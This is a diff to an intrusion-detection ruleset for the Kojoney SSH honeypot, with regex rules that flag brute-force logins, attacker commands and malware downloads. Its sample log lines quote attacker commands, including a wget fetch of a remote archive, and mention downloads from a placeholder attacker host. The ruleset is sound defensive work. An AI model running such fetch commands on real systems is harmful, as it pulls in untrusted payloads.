@@ -25,14 +25,7 @@
 #
 #####
 
-#Ruleset fot the Kojoney SSH Honeypot
-#
-#2007/04/12 21:57 CEST [SSHService ssh-userauth on SSHServerTransport,3,88.64.180.35] root trying auth password
-#2007/04/12 21:57 CEST [SSHService ssh-userauth on SSHServerTransport,3,88.64.180.35] root authenticated with password
-#2007/04/12 21:57 CEST [SSHChannel session (0) on SSHService ssh-connection on SSHServerTransport,3,88.64.180.35] COMMAND IS : pwd
-#2007/04/13 02:51 CEST [SSHChannel session (0) on SSHService ssh-connection on SSHServerTransport,7,62.57.64.166] executing command "id"
-
-
+#DESCRIPTION:SSH Brute Force Login Attempt
 #LOG:2007/04/12 21:57 CEST [SSHService ssh-userauth on SSHServerTransport,3,88.64.180.35] root trying auth password
 regex=\[SSHService ssh-userauth on SSHServerTransport,\d+,(\S+)\] (\S+) trying auth password; \
  classification.text=SSH Brute Force Login Attempt; \
@@ -48,8 +41,9 @@ regex=\[SSHService ssh-userauth on SSHServerTransport,\d+,(\S+)\] (\S+) trying a
  assessment.impact.type=user; \
  assessment.impact.severity=medium; \
  assessment.impact.description=Someone tried to log into the SSH Honeypot with guessed username/password combinations; \
- last;
+ last
 
+#DESCRIPTION:Brute Force Login on the SSH Honeypot succeeded
 #LOG:2007/04/12 21:57 CEST [SSHService ssh-userauth on SSHServerTransport,3,88.64.180.35] root authenticated with password
 regex=\[SSHService ssh-userauth on SSHServerTransport,\d+,(\S+)\] (\S+) authenticated with password; \
  classification.text=SSH Login; \
@@ -66,8 +60,9 @@ regex=\[SSHService ssh-userauth on SSHServerTransport,\d+,(\S+)\] (\S+) authenti
  assessment.impact.type=user; \
  assessment.impact.severity=high; \
  assessment.impact.description=A Brute Force Login on the SSH Honeypot was successful; \
- last;
+ last
 
+#DESCRIPTION:SSH commands given on Honeypot command line
 #LOG:2007/04/12 21:57 CEST [SSHChannel session (0) on SSHService ssh-connection on SSHServerTransport,3,88.64.180.35] COMMAND IS : wget http://www.test.de/bla.zip // executing command "id"
 regex=\[SSHChannel session \(\d+\) on SSHService ssh-connection on SSHServerTransport,\d+,(\S+)\] (executing .*|COMMAND .*); \
  classification.text=SSH commands given on Honeypot command line; \
@@ -84,8 +79,9 @@ regex=\[SSHChannel session \(\d+\) on SSHService ssh-connection on SSHServerTran
  additional_data(0).type=string; \
  additional_data(0).meaning=Command; \
  additional_data(0).data=$2; \
- last;
+ last
 
+#DESCRIPTION:Malware download attempt. File saved.
 #LOG:2007/04/12 21:57 CEST [SSHChannel session (0) on SSHService ssh-connection on SSHServerTransport,3,88.64.180.35] Saved the file /var/log/kojoney/http___attacker_100free_com_all_tar212 requested by the attacker.
 regex=\[SSHChannel session \(\d+\) on SSHService ssh-connection on SSHServerTransport,\d+,(\S+)\] Saved the file (.*) requested by the attacker; \
  classification.text=Malware download attempt; \
@@ -102,8 +98,9 @@ regex=\[SSHChannel session \(\d+\) on SSHService ssh-connection on SSHServerTran
  additional_data(0).type=string; \
  additional_data(0).meaning=Filename; \
  additional_data(0).data=$2; \
- last;
+ last
 
+#DESCRIPTION:Malware download attempt. File could not be saved.
 #LOG:2007/04/12 21:57 CEST [SSHChannel session (0) on SSHService ssh-connection on SSHServerTransport,3,88.64.180.35] Error downloading file http://attacker_100free_com_all_tar212 request by attacker.
 regex=\[SSHChannel session \(\d+\) on SSHService ssh-connection on SSHServerTransport,\d+,(\S+)\] Error downloading file (.*) request by attacker; \
  classification.text=Malware download attempt; \
@@ -120,4 +117,4 @@ regex=\[SSHChannel session \(\d+\) on SSHService ssh-connection on SSHServerTran
  additional_data(0).type=string; \
  additional_data(0).meaning=Filename; \
  additional_data(0).data=$2; \
- last;
+ last
